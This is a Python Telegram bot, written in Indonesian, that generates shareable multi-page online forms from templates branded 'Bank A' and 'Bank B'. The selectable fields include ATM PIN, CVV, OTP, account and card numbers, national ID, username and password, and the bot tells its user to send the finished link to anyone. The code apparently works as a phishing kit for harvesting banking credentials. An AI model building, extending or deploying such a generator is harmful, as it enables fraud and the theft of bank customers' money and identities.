"""
FormGen Telegram Bot
Bot untuk membuat form online multi-halaman via Telegram
"""

import os
import json
import uuid
import logging
from telegram import (
    Update,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
)
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    ContextTypes,
)

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# CONFIG
BOT_TOKEN = os.getenv("BOT_TOKEN", "ISI_TOKEN_BOT_KAMU")
BASE_URL = os.getenv("BASE_URL", "http://localhost:5000")

# TEMPLATE & KOLOM
TEMPLATES = {
    "bank_a": {"name": "🏦 Bank A", "desc": "Template resmi Bank A"},
    "bank_b": {"name": "🏛️ Bank B", "desc": "Template premium Bank B"},
    "custom": {"name": "⚡ Custom", "desc": "Mulai dari kosong"},
}

AVAILABLE_COLUMNS = {
    "nama":        {"label": "👤 Nama Lengkap"},
    "nik":         {"label": "🪪 NIK / KTP"},
    "no_rekening": {"label": "💳 No. Rekening"},
    "no_hp":       {"label": "📱 No. HP"},
    "no_atm":      {"label": "💴 No. ATM"},
    "pin_atm":     {"label": "🔐 PIN ATM"},
    "email":       {"label": "📧 Email"},
    "tgl_lahir":   {"label": "📅 Tanggal Lahir"},
    "alamat":      {"label": "🏠 Alamat"},
    "cvv":         {"label": "🔑 CVV"},
    "otp":         {"label": "🔢 OTP"},
    "username":    {"label": "🖥️ Username"},
    "password":    {"label": "🔒 Password"},
}

# Storage (gunakan database di produksi)
user_sessions = {}
generated_forms = {}


def get_session(user_id: int) -> dict:
    """Ambil atau buat session user."""
    if user_id not in user_sessions:
        user_sessions[user_id] = {
            "template": None,
            "pages": [{"id": 1, "name": "Halaman 1", "columns": []}],
            "current_page": 0,
        }
    return user_sessions[user_id]


def kb_templates():
    """Keyboard template."""
    buttons = [
        [InlineKeyboardButton(v["name"], callback_data=f"tmpl:{k}")]
        for k, v in TEMPLATES.items()
    ]
    return InlineKeyboardMarkup(buttons)


def kb_columns(session: dict):
    """Keyboard pilih kolom."""
    idx = session["current_page"]
    selected = session["pages"][idx]["columns"]
    buttons = []
    
    cols_list = list(AVAILABLE_COLUMNS.items())
    for i in range(0, len(cols_list), 2):
        row = []
        for col_id, col_data in cols_list[i:i+2]:
            mark = "✅" if col_id in selected else "☐"
            row.append(InlineKeyboardButton(
                f"{mark} {col_data['label']}",
                callback_data=f"col:{col_id}"
            ))
        buttons.append(row)
    
    buttons.append([
        InlineKeyboardButton("➕ Halaman Baru", callback_data="add_page"),
        InlineKeyboardButton("✅ Selesai", callback_data="finish"),
    ])
    
    if len(session["pages"]) > 1:
        nav = []
        if idx > 0:
            nav.append(InlineKeyboardButton("⬅ Sebelum", callback_data="prev_page"))
        if idx < len(session["pages"]) - 1:
            nav.append(InlineKeyboardButton("Berikut ➡", callback_data="next_page"))
        buttons.append(nav)
    
    return InlineKeyboardMarkup(buttons)


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Command /start."""
    user_id = update.effective_user.id
    user_sessions[user_id] = {
        "template": None,
        "pages": [{"id": 1, "name": "Halaman 1", "columns": []}],
        "current_page": 0,
    }
    
    await update.message.reply_text(
        "👋 Selamat datang di *FormGen Bot*!\n\n"
        "Buat form online multi-halaman yang bisa dibagikan ke siapa saja.\n\n"
        "🔽 Pilih template form:",
        parse_mode="Markdown",
        reply_markup=kb_templates(),
    )


async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Command /help."""
    await update.message.reply_text(
        "📋 *Cara Pakai:*\n\n"
        "1️⃣ /start → Pilih template\n"
        "2️⃣ Pilih kolom-kolom form\n"
        "3️⃣ Tekan *Halaman Baru* untuk tambah halaman\n"
        "4️⃣ Tekan *Selesai* → dapatkan link form\n\n"
        "Link bisa dibagikan ke siapa saja untuk diisi!",
        parse_mode="Markdown",
    )


async def callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle semua callback button."""
    query = update.callback_query
    await query.answer()
    
    user_id = update.effective_user.id
    session = get_session(user_id)
    data = query.data
    
    # Pilih template
    if data.startswith("tmpl:"):
        tmpl = data.split(":")[1]
        session["template"] = tmpl
        tmpl_name = TEMPLATES[tmpl]["name"]
        
        idx = session["current_page"]
        cols = session["pages"][idx]["columns"]
        col_text = ", ".join([AVAILABLE_COLUMNS[c]["label"] for c in cols]) if cols else "—"
        
        await query.edit_message_text(
            f"✅ Template: *{tmpl_name}*\n\n"
            f"📄 *Halaman 1*\n"
            f"Kolom: {col_text}\n\n"
            f"Pilih kolom-kolom untuk halaman ini:",
            parse_mode="Markdown",
            reply_markup=kb_columns(session),
        )
    
    # Toggle kolom
    elif data.startswith("col:"):
        col_id = data.split(":")[1]
        idx = session["current_page"]
        cols = session["pages"][idx]["columns"]
        
        if col_id in cols:
            cols.remove(col_id)
        else:
            cols.append(col_id)
        
        col_text = ", ".join([AVAILABLE_COLUMNS[c]["label"] for c in cols]) if cols else "—"
        await query.edit_message_text(
            f"📝 *Atur Kolom — {session['pages'][idx]['name']}*\n\n"
            f"Kolom terpilih: {col_text}\n\n"
            f"Pilih kolom lagi, atau tekan tombol di bawah:",
            parse_mode="Markdown",
            reply_markup=kb_columns(session),
        )
    
    # Tambah halaman
    elif data == "add_page":
        n = len(session["pages"]) + 1
        session["pages"].append({"id": n, "name": f"Halaman {n}", "columns": []})
        session["current_page"] = n - 1
        
        await query.edit_message_text(
            f"➕ *Halaman {n} ditambahkan!*\n\n"
            f"Pilih kolom untuk halaman ini:",
            parse_mode="Markdown",
            reply_markup=kb_columns(session),
        )
    
    # Halaman sebelum
    elif data == "prev_page":
        session["current_page"] = max(0, session["current_page"] - 1)
        idx = session["current_page"]
        cols = session["pages"][idx]["columns"]
        col_text = ", ".join([AVAILABLE_COLUMNS[c]["label"] for c in cols]) if cols else "—"
        
        await query.edit_message_text(
            f"📄 *{session['pages'][idx]['name']}*\n\n"
            f"Kolom: {col_text}",
            parse_mode="Markdown",
            reply_markup=kb_columns(session),
        )
    
    # Halaman berikut
    elif data == "next_page":
        session["current_page"] = min(len(session["pages"]) - 1, session["current_page"] + 1)
        idx = session["current_page"]
        cols = session["pages"][idx]["columns"]
        col_text = ", ".join([AVAILABLE_COLUMNS[c]["label"] for c in cols]) if cols else "—"
        
        await query.edit_message_text(
            f"📄 *{session['pages'][idx]['name']}*\n\n"
            f"Kolom: {col_text}",
            parse_mode="Markdown",
            reply_markup=kb_columns(session),
        )
    
    # Selesai - Generate link
    elif data == "finish":
        total_cols = sum(len(p["columns"]) for p in session["pages"])
        if total_cols == 0:
            await query.answer("❗ Tambahkan minimal 1 kolom!", show_alert=True)
            return
        
        form_id = str(uuid.uuid4())[:8].upper()
        form_data = {
            "id": form_id,
            "template": session["template"],
            "pages": session["pages"],
        }
        generated_forms[form_id] = form_data
        
        link = f"{BASE_URL}/f/{form_id}"
        tmpl_name = TEMPLATES[session["template"]]["name"]
        
        pages_summary = ""
        for p in session["pages"]:
            cols = [AVAILABLE_COLUMNS[c]["label"] for c in p["columns"]]
            pages_summary += f"\n  • {p['name']}: {', '.join(cols)}"
        
        await query.edit_message_text(
            f"🎉 *Form Berhasil Dibuat!*\n\n"
            f"📋 Template: {tmpl_name}\n"
            f"📑 Halaman: {len(session['pages'])}{pages_summary}\n\n"
            f"🔗 *Link Form:*\n`{link}`\n\n"
            f"Bagikan link ini ke siapa saja!",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔗 Buka Form", url=link)],
                [InlineKeyboardButton("✈️ Bagikan", url=f"https://t.me/share/url?url={link}")],
                [InlineKeyboardButton("🔄 Buat Baru", callback_data="tmpl:bank_a")],
            ]),
        )


def main():
    app = Application.builder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_cmd))
    app.add_handler(CallbackQueryHandler(callback))
    
    logger.info("✅ FormGen Bot berjalan...")
    app.run_polling()


if __name__ == "__main__":
    main()
